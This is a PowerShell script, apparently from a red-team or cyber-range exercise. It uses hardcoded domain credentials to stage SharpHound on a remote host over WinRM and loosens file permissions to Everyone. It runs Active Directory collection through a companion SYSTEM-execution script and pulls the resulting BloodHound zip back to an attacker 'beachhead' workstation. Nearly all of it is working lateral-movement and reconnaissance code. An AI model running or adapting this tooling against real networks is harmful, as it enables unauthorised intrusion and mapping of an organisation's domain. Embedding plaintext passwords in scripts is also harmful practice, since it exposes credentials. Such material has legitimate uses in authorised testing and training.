[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteDir = "C:\Windows\Temp\cadre-tools",
    [Parameter(Mandatory=$false)]
    [string]$ZipPrefix = "T004-mbr01-bh"
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)

# Stage SharpHound from ws01 beachhead to mbr01 Users/Public via PSRemoting (MITRE T1570)
$src = Join-Path $ToolSource "BloodHound-master\Collectors\SharpHound.exe"
if (-not (Test-Path $src)) {
    $src = Join-Path $ToolSource "BloodHound-win32-x64\resources\app\Collectors\SharpHound.exe"
}
if (-not (Test-Path $src)) {
    $src = Join-Path $ToolSource "SharpHound.exe"
}
if (-not (Test-Path $src)) { throw "SharpHound.exe not found in $ToolSource" }
$remoteTool = Join-Path $RemoteDir "SharpHound.exe"
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($d) New-Item -ItemType Directory -Force -Path $d | Out-Null } -ArgumentList $RemoteDir
    Copy-Item -Path $src -Destination $remoteTool -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p) icacls $p /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteTool
    Write-Output "STAGED: $src -> $remoteTool"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$script = @"
`$tool = '$remoteTool'
`$dir = '$RemoteDir'
icacls `$dir /grant "Everyone:(OI)(CI)(R)" | Out-Null
Push-Location `$dir
& `$tool -c DCOnly --ZipFileName $ZipPrefix
`$z = Get-ChildItem `$dir -Filter "*$ZipPrefix*.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if (`$z) {
    `$fixed = Join-Path `$dir "T004-mbr01-bh.zip"
    Copy-Item `$z.FullName `$fixed -Force
    icacls `$fixed /grant "Everyone:(R)" | Out-Null
}
Pop-Location
Write-Output "T004_MBR01_BH_OK: SharpHound completed in `$dir"
"@

& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -ScriptBlock $script

# Pull zip back to ws01 for operator ingestion
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    $remoteZip = Invoke-Command -Session $sess -ScriptBlock { param($d,$p) Get-ChildItem $d -Filter "$p.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1 } -ArgumentList $RemoteDir,"T004-mbr01-bh"
    if (-not $remoteZip) { throw "No SharpHound zip found on $Server" }
    $localName = "T004-mbr01-bh.zip"
    $localZip = "C:\Tools\cadre-attack\$localName"
    Copy-Item -Path $remoteZip.FullName -Destination $localZip -FromSession $sess -Force
    Write-Output "PULLED: $($remoteZip.FullName) -> $localZip"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}
